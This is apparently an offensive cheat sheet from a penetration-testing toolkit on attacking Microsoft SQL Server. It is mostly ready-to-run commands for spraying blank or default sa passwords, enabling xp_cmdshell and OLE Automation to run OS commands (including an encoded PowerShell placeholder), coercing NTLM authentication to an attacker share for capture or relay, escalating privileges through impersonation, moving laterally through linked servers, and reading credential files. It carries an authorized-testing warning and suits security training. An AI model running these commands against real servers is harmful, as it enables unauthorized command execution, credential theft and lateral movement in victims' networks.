---
service: mssql
title: Microsoft SQL Server
ports: 1433
aliases: sql-server, sqlserver, mssql
---

# MSSQL — quick wins

**When you see it:** 1433/tcp open and login succeeds as `sa` or a Windows
account with `sysadmin` role → `xp_cmdshell` is one `sp_configure` call away
from OS-level command execution.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to or
> execute on the target — get sign-off before running and clean up
> (`sp_configure 'xp_cmdshell',0`) afterwards.

## Triage (read-only)
```sh
# Banner + empty-password + NTLM info
nmap -sV -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info H

# Login check + sysadmin role probe (impacket)
mssqlclient.py U:P@H
mssqlclient.py -windows-auth DOMAIN/U:P@H

# From SQL prompt:
SELECT @@VERSION; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name, is_disabled FROM sys.server_principals ORDER BY name;

# nxc spray / check
nxc mssql H -u U -p P -q 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'');'
```

## Quick wins

### Weak/default sa credentials
```sh
mssqlclient.py sa:@H            # blank password
mssqlclient.py sa:sa@H
mssqlclient.py sa:Password1@H
```
*Why:* `sa` (SQL Server system admin) with a blank or default password grants
`sysadmin` immediately. SQL auth must be enabled; mixed-mode installs are common
in older deployments.

### Enable and run xp_cmdshell ✏️
```sql
-- Run from mssqlclient.py or any SQL prompt with sysadmin
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -enc BASE64_ENCODED_COMMAND';
-- Cleanup:
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
```
*Why:* `xp_cmdshell` runs OS commands as the SQL Server service account
(often `NT Service\MSSQLSERVER` or a domain service account). Requires
`sysadmin`. The four-statement sequence is necessary — `show advanced options`
must be enabled first before `xp_cmdshell` becomes a valid parameter.

### OLE Automation alternative to xp_cmdshell ✏️
```sql
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @sh INT;
EXEC sp_OACreate 'WScript.Shell', @sh OUT;
EXEC sp_OAMethod @sh, 'Run', NULL, 'cmd.exe /c whoami > C:\Windows\Temp\out.txt', 0, 1;
EXEC sp_OADestroy @sh;
-- Read result:
EXEC xp_cmdshell 'type C:\Windows\Temp\out.txt';
```
*Why:* alternative execution path when `xp_cmdshell` is renamed or monitored;
`sp_OACreate`/`sp_OAMethod` invoke COM objects. Requires `sysadmin`.

### xp_dirtree — UNC path NTLM capture ✏️
```sql
-- On attacker, start: responder -I ETH -wPv  OR  impacket-ntlmrelayx -t TARGET
EXEC xp_dirtree '\\ATT\share';
-- also works: xp_fileexist, EXEC master..xp_dirtree
```
*Why:* SQL Server resolves the UNC path and sends an NTLM authentication
request to your listener — captures NetNTLMv2 for offline crack or relays it.
No `sysadmin` required when `public` role has `EXECUTE` on `xp_dirtree`.

### IMPERSONATE / EXECUTE AS privilege escalation
```sql
-- List principals you can impersonate
SELECT distinct b.name FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate sa and escalate
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;  -- should be 'sa'
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```
*Why:* `IMPERSONATE` on a higher-privileged login is a direct privilege
escalation path — no exploit needed, just SQL syntax.

### Linked server lateral movement ✏️
```sql
-- Enumerate linked servers
SELECT name, data_source FROM sys.servers WHERE is_linked = 1;

-- Execute on a linked server
EXECUTE ('EXEC xp_cmdshell ''whoami''') AT LINKED_SERVER_NAME;

-- If self-linked, use for local privesc:
EXECUTE ('EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE') AT [LOCAL_SRV];
```
*Why:* linked servers often authenticate with higher privileges than your
current session (stored credentials or Windows passthrough) — lateral movement
or privilege escalation without additional exploits.

### BULK INSERT — file read as SQL service account
```sql
CREATE TABLE tmp_read (line VARCHAR(8000));
BULK INSERT tmp_read FROM 'C:\Windows\System32\drivers\etc\hosts'
  WITH (ROWTERMINATOR = '\n');
SELECT * FROM tmp_read;
DROP TABLE tmp_read;
```
*Why:* reads local files accessible to the SQL Server service account.
Useful for grabbing config files, connection strings, and credential stores.
Requires `ADMINISTER BULK OPERATIONS` or `sysadmin`.

## aranum helpers
- `aranumtoolkit/network/enum-mssql.sh` — produced this finding (nmap NSE,
  nxc cred spray, version + sysadmin role query, xp_cmdshell probe).
- No standalone exploit helper exists; manual steps above apply.
  Use `mssqlclient.py` (impacket) as the interactive shell for all SQL steps.

## Gotchas
- Windows auth (`-windows-auth`) is required for domain accounts; `sa` uses SQL
  auth. Confirm `SELECT LOGINPROPERTY('sa','isntname')` — 0 = SQL, 1 = Windows.
- `xp_cmdshell` may be renamed via `sp_rename` on hardened installs; check
  `sys.objects WHERE name LIKE '%cmd%'` if `EXEC xp_cmdshell` returns "object
  not found."
- SQL Server 2022+ enables the `Contained Database Authentication` feature by
  default — guest access to contained DBs can be a separate entry point.
- NTLM capture via `xp_dirtree` fails if the SQL Server host is configured to
  use Kerberos-only or if SMB signing is enforced on the attacker relay target.
- `sp_OACreate` requires `Ole Automation Procedures` to be enabled, same
  `sp_configure` ceremony as `xp_cmdshell`. Both are audited by default in SQL
  Server Audit.

## Sources
- HackTricks `1433-pentesting-mssql-microsoft-sql-server`; PayloadsAllTheThings
  MSSQL section; impacket mssqlclient.py docs; Hackviser MSSQL cheat sheet.
